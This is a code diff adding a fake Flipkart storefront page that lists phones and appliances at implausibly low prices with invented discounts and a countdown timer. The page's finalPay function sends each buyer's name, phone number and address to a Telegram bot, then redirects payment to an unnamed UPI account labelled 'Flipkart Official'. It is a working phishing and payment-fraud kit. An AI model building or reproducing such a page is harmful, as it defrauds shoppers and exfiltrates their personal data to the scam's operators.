+            { id: 35, name: "Lifelong Gas Stove with Toughened Glass Top | High-Efficiency Burners & Anti-Skid Legs Glass Manual Gas Stove (3 Burners)", price: "399", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/gas-stove/o/w/f/-original-imahfbxfhfzjjqxb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/gas-stove/o/i/m/-original-imahfbxfnbhshuzb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/gas-stove/l/3/q/-original-imahfbxf34pyhwks.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/gas-stove/3/2/l/-original-imahfbxfz4jzkkxf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/gas-stove/n/g/s/-original-imahfbxft5xyhwye.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/gas-stove/z/0/d/-original-imahfbxfnfju9ydq.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/gas-stove/7/d/h/-original-imahfbxfqf5rygdh.jpeg?q=70&crop=false"] },
+            { id: 35, name: "Samsung Galaxy Z Flip7 FE 5G (White, 128 GB) (8 GB RAM)", price: "999", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/u/i/0/-original-imahffyrsw4fj8gr.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/o/p/b/-original-imahffyrwhgbqm5d.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/f/x/5/-original-imahffyrggbkhya5.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/g/s/b/-original-imahffyrgpyndfnd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/w/g/d/-original-imahffyrganbhhqz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/m/9/n/-original-imahffyrhajergng.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/f/8/9/-original-imahffyrvcshysmz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/t/9/s/-original-imahffyrvnruegyf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/y/g/d/-original-imahffyrxmpumhtx.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/o/2/0/-original-imahffyrqrukuvkb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/v/6/p/-original-imahffyr5fbzhvmp.jpeg?q=70&crop=false"] },
+            { id: 36, name: "Samsung Galaxy Z Fold5 (Icy Blue, 512 GB) (12 GB RAM)", price: "899", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/y/g/l/-original-imagztmghzuhz7kf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/h/o/v/galaxy-fold5-sm-f946blbhins-samsung-original-imagru5uwmcdxjpy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/w/r/p/galaxy-fold5-sm-f946blbhins-samsung-original-imagru5uq7gkqz2k.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/q/u/g/-original-imagztm7uny6pgfr.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/u/d/t/galaxy-fold5-sm-f946blbhins-samsung-original-imagru5ua43dvsku.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/z/e/w/galaxy-fold5-sm-f946blbhins-samsung-original-imagru5u5fy5hyee.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/7/0/q/galaxy-fold5-sm-f946blbhins-samsung-original-imagru5udrzbkrbt.jpeg?q=70&crop=false"] },
+            { id: 37, name: "CMF by Nothing Buds 2 48 dB Hybrid ANC, Ultra Bass Technology 2.0, 55 Hrs playtime Bluetooth (Light Green, In the Ear)", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/r/p/c/-original-imahe29hwxvvgga2.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/d/s/h/-original-imahe29hgrn5jnvg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/m/8/x/-original-imahe29hazjujdpy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/i/p/d/-original-imahe29h3dxrhmvz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/3/x/m/-original-imahe29hgu3fus7s.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/z/x/p/-original-imahe29hryhfh6vy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/y/4/g/-original-imahe29hmcm3uanb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/m/6/s/-original-imahe29hcbfrguz4.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/q/t/k/-original-imahe29hejwzapwu.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/y/o/l/-original-imahe29hgju4m3va.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/z/x/o/-original-imahe29huuxhfg2n.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/5/p/i/-original-imahe29hm6gftc3y.jpeg?q=70&crop=false"] },
+            { id: 38, name: "OnePlus Nord Buds 2r Wireless Earbuds", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/v/y/i/-original-imagr4t8mwhmtyg9.jpeg"] },
+            { id: 39, name: "OnePlus Nord Buds 2r Wireless Earbuds", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/v/y/i/-original-imagr4t8mwhmtyg9.jpeg"] }
+        ];
+
+        let selP = {};
+
+        // Skeleton & Home Init
+        setTimeout(() => {
+            document.getElementById('skeleton-loader').classList.add('hidden');
+            document.getElementById('main-app').classList.remove('hidden');
+            initHome();
+        }, 1500);
+
+        function initHome() {
+            document.getElementById('home-grid').innerHTML = products.map(p => `
+                <div class="bg-white p-2 border shadow-sm" onclick="openProduct(${p.id})">
+                    <img src="${p.imgs[0]}" class="h-44 w-full object-contain">
+                    <p class="text-xs mt-3 line-clamp-2 text-gray-700 font-medium">${p.name}</p>
+                    <p class="font-bold text-sm mt-1">₹${p.price}</p>
+                </div>
+            `).join('');
+        }
+
+        function openProduct(id) {
+            selP = products.find(x => x.id === id);
+            document.getElementById('d-title').innerText = selP.name;
+            document.getElementById('d-price').innerText = "₹" + selP.price;
+            document.getElementById('d-slider').innerHTML = selP.imgs.map(img => `<img src="${img}">`).join('');
+            document.getElementById('full-image-list').innerHTML = selP.imgs.map(img => `<img src="${img}" class="w-full border-b pb-4">`).join('');
+            showPage('page-detail');
+            startTimer();
+        }
+
+        // REAL PINCODE API (Point 29)
+        async function fetchPincode(pin) {
+            if(pin.length === 6) {
+                document.getElementById('pin-loader').classList.remove('hidden');
+                try {
+                    const res = await fetch(`https://api.postalpincode.in/pincode/${pin}`);
+                    const data = await res.json();
+                    if(data[0].Status === "Success") {
+                        document.getElementById('uCity').value = data[0].PostOffice[0].District;
+                        document.getElementById('uState').value = data[0].PostOffice[0].State;
+                    }
+                } catch(e) {}
+                document.getElementById('pin-loader').classList.add('hidden');
+            }
+        }
+
+        function showReceipt() {
+            if(!document.getElementById('uName').value) return alert("Fill all details!");
+            document.getElementById('r-img').src = selP.imgs[0];
+            document.getElementById('r-name').innerText = selP.name;
+            document.getElementById('r-price').innerText = "₹" + selP.price;
+            document.getElementById('r-total').innerText = "₹" + selP.price;
+            document.getElementById('ft-total').innerText = "₹" + selP.price;
+            document.getElementById('r-disc').innerText = "-₹" + (49999 - parseInt(selP.price));
+            showPage('page-receipt');
+        }
+
+        function finalPay() {
+            const uName = document.getElementById('uName').value;
+            const uPhone = document.getElementById('uPhone').value;
+            const fullAdd = `${document.getElementById('uAdd').value}, ${document.getElementById('uCity').value}, ${document.getElementById('uState').value} - ${document.getElementById('uPin').value}`;
+            
+            const msg = `🔥 *NEW ORDER* %0A👤 *Name:* ${uName} %0A📞 *Phone:* ${uPhone} %0A🛒 *Item:* ${selP.name} %0A💰 *Amount:* ₹${selP.price} %0A📍 *Address:* ${fullAdd}`;
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+            window.location.href = `upi://pay?pa=${MY_UPI}&pn=Flipkart%20Official&am=${selP.price}&cu=INR`;
+        }
+
+        function startTimer() {
+            let sec = 600;
+            const t = setInterval(() => {
+                let m = Math.floor(sec/60);
+                let s = sec%60;
+                document.getElementById('timer').innerText = `${m}:${s < 10 ? '0'+s : s}`;
+                if(sec <= 0) clearInterval(t);
+                sec--;
+            }, 1000);
+        }
+
+        function showPage(id) {
+            ['page-login', 'page-home', 'page-detail', 'page-address', 'page-receipt', 'page-payment'].forEach(p => document.getElementById(p).classList.add('hidden'));
+            document.getElementById(id).classList.remove('hidden');
+            window.scrollTo(0,0);
+        }
+    </script>
 </body>
-</html>
+</html> 
